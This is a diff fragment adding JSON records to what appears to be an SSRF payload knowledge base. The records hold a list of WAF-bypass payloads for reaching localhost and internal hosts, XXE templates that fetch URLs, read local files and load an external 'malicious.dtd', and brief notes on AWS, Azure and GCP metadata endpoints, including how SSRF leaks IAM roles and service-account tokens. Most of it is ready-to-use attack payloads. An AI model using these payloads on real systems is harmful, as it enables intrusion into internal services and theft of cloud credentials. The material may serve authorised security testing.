+    "content": "# WAF Bypass Payloads\n127.0.0.1#\n127.0.0.1%23\n127.0.0.1%2523\n127.0.0.1:80#\nlocalhost#\n127.0.0.1:80?\nlocalhost?\n127.0.0.1%3F\nhttp://127.0.0.1/admin\nhttp://127.0.0.1/%2e%2e\nhttp://127.0.0.1/%2e/\nhttp://127.0.0.1/..;/\n127.0.0.1%0d%0a\n127.0.0.1%0a\n127.0.0.1%09\n127.0.0.1%20\n127.0.0.1:80\\\\@google.com/\nhttp://google.com@127.0.0.1\nwhitelisted.com@localhost\nhttp://127.0.0.1:80/\nhttp://[::]:80/\nhttp://[0:0:0:0:0:ffff:127.0.0.1]/\nhttp://[::ffff:127.0.0.1]\nhttp://[::ffff:7f00:1]\nhttp://0/\nhttp://127.1/\nhttp://localhost:80\nhttp://localHOST\nhTtP://127.0.0.1\n127.0.0.1.xip.io\n127.0.0.1.nip.io\nspoofed.burpcollaborator.net\n127.0.0.1.burpcollaborator.net\n127.0.0.1.interact.sh\n127.0.0.1.sslip.io\nlocaltest.me\nhttp://127.0.0.1%00.example.com"
+  },
+  {
+    "source": "local-payload",
+    "filename": "xxe_ssrf.txt",
+    "technique": "General SSRF",
+    "target": "Unknown",
+    "content": "<!-- Payloads for XXE-based SSRF. {payload} will be replaced by the target URL or file path. -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://{payload}\">]><root>&xxe;</root>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///{payload}\">]><root>&xxe;</root>\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://{payload}\"><!ENTITY % dtd SYSTEM \"data://text/plain;base64,PCFET0NUWVBFIGRhdGEgWzwhRU5USVRZICUgcmVzdWx0IFNZU1RFTSAlcHJvdG87JT5dPg==\"><!ENTITY % proto \"http://{payload}\">%dtd;]><root/>\n<?xml version=\"1.0\" ?><!DOCTYPE a [<!ENTITY % xxe SYSTEM \"http://{payload}\"> %xxe;]><foo/>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://{payload}\" >]><foo>&xxe;</foo>\n<?xml version=\"1.0\"?><!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://{payload}\"><!ENTITY % all \"<!ENTITY &#x25; M SYSTEM 'http://{payload}/malicious.dtd'> &#x25;M;\">%all;]>"
+  },
+  {
+    "source": "docs",
+    "title": "AWS IMDSv1 vs IMDSv2",
+    "technique": "Cloud Metadata",
+    "target": "AWS",
+    "content": "Instance Metadata Service (IMDS) allows EC2 instances to access metadata. IMDSv1 is vulnerable to SSRF as it uses simple GET requests. IMDSv2 requires a Session Token (PUT request) to mitigate SSRF. SSRF against 169.254.169.254 can leak IAM roles."
+  },
+  {
+    "source": "docs",
+    "title": "Azure Instance Metadata Service",
+    "technique": "Cloud Metadata",
+    "target": "Azure",
+    "content": "Azure IMDS is available at 169.254.169.254. All requests must include the 'Metadata: true' header to prevent SSRF. It provides info about the instance, network, and managed identities."
+  },
+  {
+    "source": "docs",
+    "title": "Google Cloud Metadata Server",
+    "technique": "Cloud Metadata",
+    "target": "GCP",
+    "content": "GCP Metadata is at metadata.google.internal (169.254.169.254). Requires 'Metadata-Flavor: Google' header. SSRF can be used to exfiltrate service account tokens."
+  }
+]
